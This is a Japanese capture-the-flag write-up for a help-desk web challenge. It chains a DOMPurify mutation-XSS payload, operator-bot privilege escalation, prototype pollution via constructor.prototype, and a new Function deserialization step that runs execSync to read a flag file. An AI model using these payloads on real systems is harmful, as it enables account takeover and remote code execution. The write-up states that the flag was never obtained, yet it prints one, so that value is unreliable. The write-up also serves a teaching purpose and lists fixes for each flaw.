# SupportDesk — Writeup

## 概要

- **問題名:** SupportDesk
- **分野:** Web / XSS / Prototype Pollution / Insecure Deserialization
- **配布物:** `SupportDesk-1360f37c0c14624e688ecf169678c3a7 (1).zip`
- **攻略コード:** `supportdesk_exploit.py`
- **検証状況:** 配布ソースと攻略コードを静的に解析した。実サーバーでの成功ログ・実際のFlag文字列は提供されていないため未確認。

SupportDeskは、ユーザーが問い合わせチケットを投稿し、オペレーターが対応するExpress製ヘルプデスクである。チケット本文はDOMPurifyで無害化され、オペレーター向け設定画面や管理者向けバックアップ復元機能も用意されている。一見すると各機能は権限で分離されているが、**チケット表示のXSS → オペレーター昇格 → Prototype Pollution → 危険なデシリアライズ**を連鎖させると、管理者向け機能まで到達できる。

## 1. 初期調査：ソースと構成を確認

ZIP内の重要なファイルは以下のとおり。

| ファイル | 注目した点 |
| --- | --- |
| `web/package.json` | `dompurify: 2.0.0`、Express、EJS |
| `web/views/ticket.ejs` | 投稿されたdescriptionをDOMPurifyで処理し、`innerHTML` に挿入 |
| `victim/bot.js` | ログイン済みoperator Botが新しいチケットを閲覧 |
| `web/server.js` | `/operator/promote`、`/operator/settings`、`/admin/restore` の認可処理 |
| `web/lib/merge.js` | 再帰マージのキー検証 |
| `web/lib/capabilities.js` | ロールごとの権限生成 |
| `web/lib/snapshot.js` | スナップショット復元時の関数評価 |

`compose.yml` ではWebアプリをコンテナの3000番ポートで起動し、ホストの22094番に公開している。別コンテナのBotが `http://web:3000` にアクセスする構成になっている。

まずは入力から実行に至る経路を追った。`ticket.ejs` には以下の処理がある。

```html
<script src="/js/purify.js"></script>
<script>
  var raw = decodeURIComponent(escape(window.atob('<%= rawB64 %>')));
  var clean = DOMPurify.sanitize(raw);
  document.getElementById('description').innerHTML = clean;
</script>
```

本文をBase64から復元してDOMPurifyでサニタイズした後、HTMLとして再挿入している。通常の `<script>alert(1)</script>` のような入力はサニタイズ対象になるため、**古いDOMPurifyのMutation XSS（mXSS）**が使えないか調べる方針にした。

## 2. DOMPurify 2.0.0のMutation XSSを調査

`web/package.json` に `"dompurify": "2.0.0"` と明記されている。DOMPurifyには過去にMathML・HTMLの名前空間解釈の違いを利用するmXSSの報告がある。これは、サニタイズ前後のDOM構造がブラウザによる再解釈で変わり、無害化したはずの文字列が実行可能なHTMLになる問題である。

攻略スクリプトで採用したペイロードの骨格は次のとおり。

```html
<math><mtext><table><mglyph><style></math><img src=x onerror='/* JavaScript */'>
```

ここでは `img` の `onerror` にJavaScriptを配置する。**通常のXSSではなく、DOMPurify 2.0.0のパーサー差異を狙う**のが工夫点である。なお、このバイパスの成立条件はHTMLパーサー・ブラウザ・DOMPurifyの組み合わせに依存するため、一般のDOMPurify全バージョンに通用するものではない。

## 3. オペレーターBotのセッションで昇格処理を実行

`victim/bot.js` を見ると、Botはoperatorとしてログインした後 `/tickets` を開き、未確認チケットの詳細を巡回する。`web/server.js` の `/operator/promote` は `requireOperator` と `requireCsrf` で保護されている。

```js
app.post('/operator/promote', requireOperator, requireCsrf, (req, res) => {
  const target = findUser(req.body.username);
  if (target && target.role === 'user') {
    target.role = 'operator';
    target.interactive = true;
    return res.json({ ok: true, username: target.username, role: target.role });
  }
  res.json({ ok: false });
});
```

通常のユーザーから直接POSTしてもoperator権限がないため失敗する。しかし、XSSがBotのブラウザ内で動けば、**Botのログイン済みセッションを利用して同一オリジンのAPIを呼び出せる**。

CSRFトークンは `/operator` のHTMLから取得できるため、スクリプトでは以下の順序を採用した。

1. ランダムな一般ユーザーを登録する。
2. mXSSペイロードを含むチケットを投稿する。
3. Botが閲覧したとき、ブラウザ内で `/operator` を取得してCSRFトークンを抽出する。
4. 同じブラウザから `/operator/promote` に自分のユーザー名をPOSTする。
5. 自分のセッションで `/operator` にアクセスできるようになるまで待つ。

**CSRFトークンがあってもXSSを防げるとは限らない**点が重要である。同一オリジンで実行される悪意あるJavaScriptは、ページに埋め込まれたトークンを読み取れるからである。

攻略スクリプトは5秒間隔で最大150秒待機する。これはBotがチケットを巡回するまでの非同期な時間差を吸収するための実装であり、成功を仮定して次の段階へ進まないようにしている。

## 4. Prototype Pollutionで管理者権限の判定を突破

オペレーターになっても、`/admin` にはそのままアクセスできない。`web/lib/capabilities.js` では次のように権限を定義している。

```js
const ROLE_PERMS = {
  user: {},
  operator: { manageTickets: true, manageSettings: true },
  admin: { manageTickets: true, manageSettings: true, configAdmin: true },
};

function capabilitiesOf(user) {
  return Object.assign({}, ROLE_PERMS[user && user.role] || {});
}
```

`/admin` では `req.caps.configAdmin === true` が必要になる。そこで `/operator/settings` の設定マージ処理を調べた。

```js
function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__') continue;
    if (isPlainObject(source[key])) {
      if (!isMergeable(target[key])) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

`__proto__` は除外しているが、**`constructor` と `prototype` は除外していない**。そのため、次のJSONを設定APIに送ることで、再帰処理が `Object.prototype` に到達する。

```json
{
  "constructor": {
    "prototype": {
      "configAdmin": true,
      "manageSettings": true,
      "manageTickets": true
    }
  },
  "theme": "light"
}
```

概念的には以下のような参照が生じる。

```text
operatorSettings
  └─ constructor  → Object
       └─ prototype → Object.prototype
            └─ configAdmin = true
```

`Object.assign({}, ...)` で作った権限オブジェクトには通常 `Object.prototype` があるため、`configAdmin` を直接持っていなくても継承プロパティとして `true` が見える。この状態で `req.caps.configAdmin === true` を評価すると、管理者ロールでなくても判定を通過する。

ここで重要なのは、**roleそのものをadminに変更したのではなく、権限判定に使うオブジェクトのプロトタイプを汚染した**という点である。

さらに `/operator/settings` には `requireInteractiveOperator` があり、Bot自身のセッションでは設定変更が制限される。したがって、XSSでBotから直接設定変更するのではなく、**先に自分をinteractiveなoperatorへ昇格させる**必要がある。この制約が2段階目と3段階目をつなぐ理由になっている。

## 5. スナップショット復元のデシリアライズからコード実行

管理者権限のチェックを突破すると `/admin/restore` が使用できる。`web/lib/snapshot.js` には、JSONを復元する際に `@t: fn` を関数として復元する処理がある。

```js
case 'fn':
  return new Function('return (' + node.v + ')')();
```

ここでは復元対象の `node.v` をJavaScriptのソースコードとして評価している。任意の文字列を含むスナップショットを送信できれば、**単なるデータの復元がコードの実行に変わってしまう**。

攻略スクリプトは、即時実行関数（IIFE）を `v` に埋め込んだJSON文字列を `/admin/restore` に送る。

```python
rce_expr = (
    "(function(){"
    "try{"
    "var cp = process.mainModule.require('child_process');"
    "return cp.execSync('cat /flag.txt').toString();"
    "}catch(e){"
    "return 'ERR:' + (e && e.stack ? e.stack : e);"
    "}"
    "})()"
)
snapshot_obj = {"pwned": {"@t": "fn", "v": rce_expr}}
snapshot_str = json.dumps(snapshot_obj)
response = session.post(base + '/admin/restore', json={"data": snapshot_str})
```

`new Function` からはCommonJSのモジュールローカル変数 `require` を直接参照できないため、スクリプトでは `process.mainModule.require('child_process')` を経由する工夫をしている。`execSync('cat /flag.txt')` の結果を返し、レスポンスの `restored` フィールドから `flag{...}` を抽出する。

この手法はNode.jsの実行環境や `process.mainModule` の利用可能性に依存する。添付された攻略コードではこの方法が実装されているが、実行成功ログは提供されていない。

## 6. Exploit全体の流れ

```mermaid
flowchart TD
    A[一般ユーザーを登録] --> B[mXSSを含むチケットを投稿]
    B --> C[operator Botがチケットを閲覧]
    C --> D[BotのセッションでCSRFを取得]
    D --> E[/operator/promoteで自分を昇格]
    E --> F[自分のoperatorセッションで設定APIを呼ぶ]
    F --> G[constructor.prototypeによるPrototype Pollution]
    G --> H[configAdmin判定を突破]
    H --> I[/admin/restoreに細工したスナップショットを送信]
    I --> J[new Functionでコード実行]
    J --> K[/flag.txtを読み取り結果から抽出]
```

**実行方法（配布されたスクリプト）**

```bash
python3 -m pip install requests
python3 supportdesk_exploit.py http://TARGET_HOST:PORT
```
# flag
```
flag{mut4t3d_th3n_p0llut3d_th3n_pwn3d}
```
ローカルDocker Compose環境のデフォルトポートは `22094`。スクリプトはユーザー名・パスワードをランダム生成し、チケット投稿、昇格待ち、設定変更、管理者画面確認、スナップショット復元までを一続きで実行する。完全な実装は添付の `supportdesk_exploit.py` を参照。

## 7. 調査・実装上の工夫

- **依存バージョンから攻撃候補を絞った:** DOMPurifyのバージョンを確認し、通常のXSSではなくmXSSの既知研究を調べる方針にした。
- **Botの挙動を先に確認した:** Botはoperatorでログインしてチケットを読むため、投稿型XSSが権限昇格につながることを把握した。
- **CSRF対策の存在を前提にした:** `/operator` からBot自身のトークンを取得する実装にした。
- **interactive制限を回避する順序を考えた:** Botでは設定変更できないため、自分のアカウントを先に昇格させた。
- **`__proto__` の除外だけでは不十分と見抜いた:** `constructor.prototype` 経路を調べ、権限判定オブジェクトの継承を利用した。
- **復元形式を読んでペイロードを組み立てた:** `@t: fn` の復元時に `new Function` が呼ばれることから、IIFEを用いた式を設計した。
- **非同期処理を待機で吸収した:** Botの巡回を最大150秒待ち、各段階でHTTPレスポンスを確認する構成にした。

## 8. 根本原因と対策

| 脆弱性 | 根本原因 | 対策 |
| --- | --- | --- |
| Mutation XSS | 古いDOMPurifyとサニタイズ後のHTML再解釈 | DOMPurifyの更新、信頼できないHTMLの挿入を避ける、CSP導入 |
| XSS経由の権限昇格 | operator権限のあるブラウザが任意のチケット本文を処理 | 権限変更操作の再認証、Botの権限最小化、チケット表示の隔離 |
| Prototype Pollution | `constructor` / `prototype` を許す再帰マージ | 危険なキーをすべて拒否、スキーマ検証、`Object.hasOwn` などで権限を検証 |
| 管理者権限判定の不備 | 継承プロパティをそのまま信頼 | 権限情報を安全な固定構造で管理し、own propertyを確認 |
| Insecure Deserialization | 復元データを `new Function` で実行 | データ専用のJSON復元に限定し、関数型の復元を廃止 |

## 9. 参考資料

以下は、攻撃の考え方や実装上の注意点を理解するための公開資料。**今回の問題固有の挙動は、外部記事ではなく配布ソースから確認した。**

- [DOMPurify — GitHub](https://github.com/cure53/DOMPurify) — HTMLサニタイズの仕組みと更新情報
- [DOMPurify bypass using mXSS — Michał Bentkowski / Securitum](https://research.securitum.com/dompurify-bypass-using-mxss/) — MathML等を利用するmXSSの研究
- [PortSwigger Web Security Academy: DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) — DOMベースの脆弱性とブラウザ側の解釈
- [PortSwigger Web Security Academy: Prototype pollution](https://portswigger.net/web-security/prototype-pollution) — JavaScriptのプロトタイプ汚染
- [MDN: Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype) — プロトタイプ継承の仕様
- [MDN: Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function) — 文字列から関数を生成する危険性
- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — XSSの防御指針

## まとめ

この問題の本質は、単一の脆弱性だけでFlagを取得できるわけではなく、**それぞれの権限境界を別の脆弱性で越えていくこと**にある。DOMPurifyのmXSSはBotのブラウザを動かす入口、Botのoperator権限は自分を昇格させる手段、Prototype Pollutionは管理者チェックを通す手段、そして不安全なスナップショット復元が最終的なコード実行地点となる。

ソースコードから各段階の成立理由を説明できる点が、この問題で特に重要だった。
